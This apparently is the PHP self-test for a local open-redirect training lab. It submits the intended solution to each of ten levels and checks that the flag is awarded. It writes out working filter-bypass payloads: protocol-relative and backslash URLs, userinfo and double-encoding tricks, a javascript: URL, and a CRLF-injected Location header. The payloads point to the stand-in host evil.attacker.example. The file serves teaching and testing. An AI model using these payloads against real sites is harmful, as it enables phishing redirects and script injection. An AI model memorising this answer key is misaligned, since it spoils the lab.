<?php
/**
 * Open Redirect Lab self-test: runs the intended solution for every level
 * against the live app, so a level that has quietly stopped being solvable is
 * caught.
 *
 *   docker compose exec -T web php /var/www/html/solve_check.php
 *
 * NOTE ON WHAT IS BEING ASSERTED
 * ------------------------------
 * This lab deliberately never issues a live cross-site redirect: no level calls
 * header("Location: ..."), so `curl -i` will always show a plain 200. Instead
 * helpers.php runs the level's REAL vulnerable server-side filter and then
 * models how a browser would resolve the value that filter would have handed to
 * header()/href/location, and awards the flag only when that resolution lands
 * off the allowlist (or on a code-executing scheme, or via an injected header).
 * The assertion below is therefore "the filter accepted it AND the modelled
 * browser destination is attacker-controlled", which is what the flag gates on.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

/**
 * Request a level with $next as the DECODED value of $_GET['next'].
 * Building it with rawurlencode() keeps the payloads readable: what you write
 * here is exactly what the level's PHP code receives.
 */
function visit(int $level, string $next): string
{
    $url = "http://localhost/level$level.php?next=" . rawurlencode($next);
    $ctx = stream_context_create(['http' => [
        'method' => 'GET', 'timeout' => 30, 'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    // "Flag Captured!" pins the award block, so a stray FLAG{ in the page
    // furniture can never make a level look solved.
    $awarded = strpos($body, 'Flag Captured!') !== false;
    if ($want !== '' && $awarded && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

$evil = REDIRECT_ATTACKER_HOST;   // evil.attacker.example
$bank = REDIRECT_TRUSTED_HOST;    // example-bank.local

echo "Open Redirect Lab self-test\n---------------------------\n";

/* 1 - no validation at all */
check(1, visit(1, "https://$evil"), 'absolute URL, nothing checked');

/* 2 - str_starts_with('/') accepts a protocol-relative URL */
check(2, visit(2, "//$evil"), 'protocol-relative past the leading-slash check');

/* 3 - str_starts_with() on the host is a prefix match, not equality */
check(3, visit(3, "https://$bank.$evil/login"), 'trusted name as a leading label');

/* 4 - str_contains() is satisfied anywhere in the string */
check(4, visit(4, "https://$evil/$bank"), 'trusted name parked in the path');

/* 5 - browsers fold backslashes into forward slashes before resolving */
check(5, visit(5, '/' . chr(92) . $evil), 'backslash becomes the second slash');

/* 6 - naive authority regex reads userinfo as the host */
check(6, visit(6, "https://$bank@$evil/"), 'userinfo before the @');

/* 7 - the filter runs before an extra urldecode(); the transport already
       decoded once, so the payload has to survive as literal percent signs */
check(7, visit(7, "%2f%2f$evil"), 'double encoded so urldecode() rebuilds //');

/* 8 - parse_url() reports no host for a code-executing scheme */
check(8, visit(8, 'javascript:alert(document.domain)'), 'schemes without a host');

/* 9 - CRLF splits the header and adds a second Location */
check(9, visit(9, "/dashboard\r\nLocation: https://$evil"), 'injected Location header');

/* 10 - five layers, and parse_url() sees no host after a single slash */
check(10, visit(10, "https:/$evil/login"), 'scheme with one slash slips the host allowlist');

echo "---------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
